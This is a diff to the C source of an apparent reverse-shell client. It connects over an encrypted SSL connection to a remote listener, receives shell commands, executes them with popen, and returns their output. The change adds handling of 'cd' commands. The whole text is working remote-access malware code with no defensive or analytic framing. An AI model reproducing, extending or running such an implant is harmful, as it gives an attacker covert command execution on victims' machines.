@@ -5,6 +5,7 @@
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <errno.h>
+#include<sys/wait.h>
 
 #define BUFSIZE 1<<16
 
@@ -40,7 +41,7 @@ int main(){
 	SSL *ssl = SSL_new(ctx);
 	SSL_set_bio(ssl, bio, bio);
 
-	/* Connect and set to connected */
+	/* Connect to listener and set to connected */
 	connect(s, (struct sockaddr*) &remoteaddr, sizeof(struct sockaddr_in));
 	BIO_ctrl_set_connected(bio, 0, &remoteaddr);
 
@@ -52,36 +53,54 @@ int main(){
 	}
 	printf("Connected to %s\n", host);
 
-	/* Receive command, execute and send result */
-	char cmd[BUFSIZE];
-	char output[BUFSIZE];
+	char cmd[BUFSIZE], tokencmd[BUFSIZE], output[BUFSIZE];
 	FILE *fd;
 	char *error;
-	while(memset(cmd, 0, strlen(cmd)) && SSL_read(ssl, cmd, sizeof(cmd)) > 0){
+	char *token;
+	while(memset(cmd, 0, BUFSIZE) && SSL_read(ssl, cmd, sizeof(cmd)) > 0){
 		printf("[*] Recv: %s\n", cmd);
 
-		/* If user is not doing any stderr redirection, show him stderr */
-		if(strstr(cmd, "2>") == NULL){
-			strcat(cmd, " 2>&1");
+		strcpy(tokencmd, cmd);
+
+		/* Parse received command and run */
+		token = strtok(tokencmd, " ");
+		if(strcmp(token, "cd") == 0){
+
+			token = strtok(NULL, " ");
+			if(chdir(token) == -1){
+				error = strerror(errno);
+				SSL_write(ssl, error, strlen(error));
+				SSL_write(ssl, "\n", 2);
+			}
+
+		} else {
+
+			printf("[*] Recv: %s\n", cmd);
+
+			/* If user is not doing any stderr redirection, show stderr */
+			if(strstr(cmd, "2>") == NULL){
+				strcat(cmd, " 2>&1");
+			}
+
+			/* Execute command */
+			fd = popen(cmd, "re");
+			if(fd == NULL){
+				error = "[-] Execute command failed\n";
+				SSL_write(ssl, error, strlen(error));
+				break;
+			}
+
+			/* Read output of command and send*/
+			printf("[*] Sending command output:\n");
+			while(fgets(output, BUFSIZE, fd) != NULL){
+				printf("%s", output);
+				SSL_write(ssl, output, strlen(output));
+			}
 		}
 
-		/* Execute command */
-		fd = popen(cmd, "re");
-		if(fd == NULL){
-			error = "[-] Execute command failed\n";
-			SSL_write(ssl, error, strlen(error));
-			break;
-		}
-
-		/* Read output of command and send*/
-		printf("[*] Sending command output:\n");
-		while(fgets(output, BUFSIZE, fd) != NULL){
-			printf("%s", output);
-			SSL_write(ssl, output, strlen(output));
-		}
-		printf("end\n");
+		printf("END\n");
 		SSL_write(ssl, "", 1);
 
-		printf("--------\n");
+		printf("===========\n");
 	}
 }
